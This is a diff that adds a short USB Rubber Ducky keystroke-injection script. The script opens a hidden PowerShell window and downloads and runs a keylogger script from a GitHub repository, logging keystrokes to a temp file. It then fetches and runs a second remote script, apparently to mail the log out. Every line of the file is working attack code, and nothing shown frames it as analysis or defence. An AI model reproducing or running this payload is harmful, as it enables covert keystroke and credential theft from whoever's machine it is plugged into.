@@ -1,0 +1,16 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle hidden
+ENTER
+DELAY 1500
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HE-Arc/petitCanard/master/powershell_scripts/Get-Keystrokes.ps1')
+ENTER
+DELAY 400
+STRING Get-Keystrokes -LogPath $env:temp\key.log
+ENTER
+DELAY 200
+GUI r
+DELAY 300
+STRING powershell -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HE-Arc/petitCanard/master/powershell_scripts/mail.ps1')
+ENTER
